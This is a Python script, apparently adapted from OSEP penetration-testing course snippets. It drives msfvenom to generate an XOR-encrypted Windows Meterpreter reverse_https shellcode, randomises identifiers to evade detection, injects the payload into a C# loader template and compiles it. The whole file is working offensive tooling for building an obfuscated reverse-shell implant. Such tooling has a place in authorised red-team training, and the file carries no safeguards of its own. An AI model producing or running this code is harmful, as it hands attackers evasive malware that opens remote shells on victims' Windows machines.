#!/usr/bin/python3

# Original script
# From https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-msfvenom.py
# Basic shellcode crypter for C# payloads
# By Cas van Cooten

# jan-karel changes
# limited to csharp only
# default lport= 443
# writes out csharp project and build it


from meuk.hacksec import *



parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
parser.add_argument("luri", help="uri to call", nargs='?', default="/")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_https)", nargs='?', default="windows/x64/meterpreter/reverse_https")
args = parser.parse_args()



# simple obfuscation
letters = string.ascii_lowercase
bufnaam = ''.join(random.choice(letters) for i in range(randint(3,9)))
databuf = ''.join(random.choice(letters) for i in range(randint(3,9)))
uitvoer = ''.join(random.choice(letters) for i in range(randint(3,9)))
sleutel = ''.join(random.choice(letters) for i in range(randint(9,12)))
xorfunc = ''.join(random.choice(letters) for i in range(randint(9,12)))
shellcode = ''.join(random.choice(letters) for i in range(randint(4,8)))
waar = ''.join(random.choice(letters) for i in range(randint(4,8)))

# Generate the shellcode given the preferred payload

if args.luri:
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and  LURI={bcolors.OKGREEN}{args.luri}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
    result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}",  f"LURI={args.luri}",'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel,  "-f", "csharp"], stdout=subprocess.PIPE)
else:
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
    result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', '--encrypt', 'xor', '--encrypt-key', sleutel, "-f", "csharp"], stdout=subprocess.PIPE)


if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

template=lezen('meuk/template/crystalmeth.cs')

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")



# Get the payload bytes and split them
payload = result.stdout.decode("utf-8")

payload = payload.replace('buf', bufnaam)



decodingFunc = f"""private static byte[] [xorfunc](byte[] [bufnaam]ciph, byte[] yek)
        {{
            byte[] [xorfunc]uit = new byte[[bufnaam]ciph.Length];

            for (int i = 0; i < [bufnaam]ciph.Length; i++)
            {{
                [xorfunc]uit[i] = (byte)([bufnaam]ciph[i] ^ yek[i % yek.Length]);
            }}

            return [xorfunc]uit;
        }}"""

template = template.replace('[xorreplace]', decodingFunc)
template = template.replace('[payloadreplace]', payload).replace('[bufnaam]', str(bufnaam)).replace('[quote]', quotes().replace('"','')).replace('[databuf]', databuf).replace('[uitvoer]', uitvoer)
template = template.replace('[shellcode]', shellcode).replace('[sleutel]', sleutel).replace('[xorfunc]',xorfunc).replace('[waar]',waar)

#create the file with raw ouput
schrijven('meuk/meth/Program.cs', template)

#opslaan code voor include rapportage e.d. als payload default is
schrijven('raw/crystalmeth.cs', template)


#build it
result = subprocess.run(['xbuild', 'meuk/meth/meth.csproj'], stdout=subprocess.PIPE)
print(result.stdout)


